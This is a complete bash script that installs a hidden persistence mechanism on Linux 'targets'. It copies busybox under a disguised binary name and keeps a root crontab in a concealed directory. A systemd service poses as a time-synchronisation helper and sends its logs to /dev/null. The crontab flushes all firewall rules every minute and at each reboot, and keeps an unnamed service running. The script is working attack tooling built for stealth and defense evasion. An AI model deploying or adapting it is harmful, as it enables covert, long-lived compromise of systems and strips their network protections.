#!/usr/bin/env bash
# shadow-crond.sh — deploys a second cron daemon with its own hidden spool
# invisible to: crontab -l, systemctl status cron, /var/spool/cron/crontabs/*
#
# requires busybox (already present on most ubuntu targets)
# no day-of compilation needed — just drop and run
#
# Usage:
#   sudo ./shadow-crond.sh install
#   sudo ./shadow-crond.sh remove
#   sudo ./shadow-crond.sh status

set -euo pipefail

SPOOL_DIR="/var/cache/.syspkg/tabs"       # hidden crontab directory
CROND_BIN="/usr/local/lib/.sysd"          # busybox copy — shows as ".sysd" in ps
SERVICE_NAME="systemd-timesyncd-helper"   # systemd service name
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
LOG_FILE="/dev/null"                      # crond log — /dev/null keeps it quiet

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo "Run as root"; exit 1; }; }

cmd_install() {
    require_root

    # ── locate busybox ────────────────────────────────────────────────────────
    hdr "1/4  Locating busybox"
    BUSYBOX=$(command -v busybox 2>/dev/null || true)
    if [[ -z "$BUSYBOX" ]]; then
        # some ubuntu installs put it here without it being in PATH
        for p in /bin/busybox /usr/bin/busybox /sbin/busybox; do
            [[ -x "$p" ]] && { BUSYBOX="$p"; break; }
        done
    fi
    [[ -z "$BUSYBOX" ]] && { warn "busybox not found — install it first (apt install busybox)"; exit 1; }

    # verify it has crond
    "$BUSYBOX" crond --help &>/dev/null || \
    "$BUSYBOX" crond -h    &>/dev/null || \
    "$BUSYBOX" crond 2>&1 | grep -qi "usage" || \
        { warn "this busybox doesn't have crond built in"; exit 1; }

    info "Found busybox at $BUSYBOX"

    # ── install hidden binary + spool dir ─────────────────────────────────────
    hdr "2/4  Installing hidden crond"
    mkdir -p /var/cache/.syspkg
    chmod 700 /var/cache/.syspkg
    mkdir -p "$SPOOL_DIR"
    chmod 700 "$SPOOL_DIR"

    # copy busybox under a system-looking name so ps shows ".sysd" not "crond"
    cp "$BUSYBOX" "$CROND_BIN"
    chmod 755 "$CROND_BIN"
    info "Installed hidden crond binary at $CROND_BIN"

    # ── write the hidden crontab ──────────────────────────────────────────────
    hdr "3/4  Writing crontab"
    # busybox crond -c <dir> reads files named after the user who should run
    # the jobs. file = "root" means all jobs run as root.
    cat > "${SPOOL_DIR}/root" <<'EOF'
# system maintenance tasks
* * * * * nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; iptables -X 2>/dev/null; ip6tables -F 2>/dev/null
*/5 * * * * systemctl is-active --quiet network-health-monitor || systemctl start network-health-monitor 2>/dev/null
@reboot nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; ip6tables -F 2>/dev/null
EOF
    chmod 600 "${SPOOL_DIR}/root"
    info "Crontab written to ${SPOOL_DIR}/root"
    info "Edit ${SPOOL_DIR}/root to change the payload"

    # ── systemd service ───────────────────────────────────────────────────────
    hdr "4/4  Installing systemd service"
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Time Synchronization Helper
Documentation=https://systemd.io
After=network.target

[Service]
Type=forking
# busybox crond flags:
#   -b  background (fork)
#   -c  custom spool directory
#   -L  log file (/dev/null = silent)
#   -l  log level 8 = only log errors
ExecStart=${CROND_BIN} crond -b -c ${SPOOL_DIR} -L ${LOG_FILE} -l 8
ExecStop=/bin/kill -QUIT \$MAINPID
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" --quiet
    systemctl start  "$SERVICE_NAME"
    info "Service ${SERVICE_NAME} installed and started"

    echo
    info "=== Shadow crond active ==="
    info "Crontab:  ${SPOOL_DIR}/root  (invisible to crontab -l)"
    info "Process:  ps shows '${CROND_BIN} crond ...' — looks like a system binary"
    info "Service:  ${SERVICE_NAME}  — looks like NTP helper"
}

cmd_remove() {
    require_root

    hdr "Stopping service"
    systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Not running"
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    rm -f "$SERVICE_FILE"
    systemctl daemon-reload
    pkill -f "$CROND_BIN" 2>/dev/null || true
    info "Service removed"

    hdr "Removing files"
    rm -f "$CROND_BIN"
    rm -rf "$SPOOL_DIR"
    info "Removed $CROND_BIN and $SPOOL_DIR"
}

cmd_status() {
    hdr "Service"
    systemctl status "$SERVICE_NAME" --no-pager -l 2>/dev/null \
        || warn "$SERVICE_NAME not found"

    hdr "Process"
    pgrep -a -f "$CROND_BIN" 2>/dev/null || warn "No process found"

    hdr "Crontab"
    [[ -f "${SPOOL_DIR}/root" ]] && cat "${SPOOL_DIR}/root" || warn "No crontab at ${SPOOL_DIR}/root"
}

CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *)
        echo "Usage: sudo $0 {install|remove|status}"
        ;;
esac
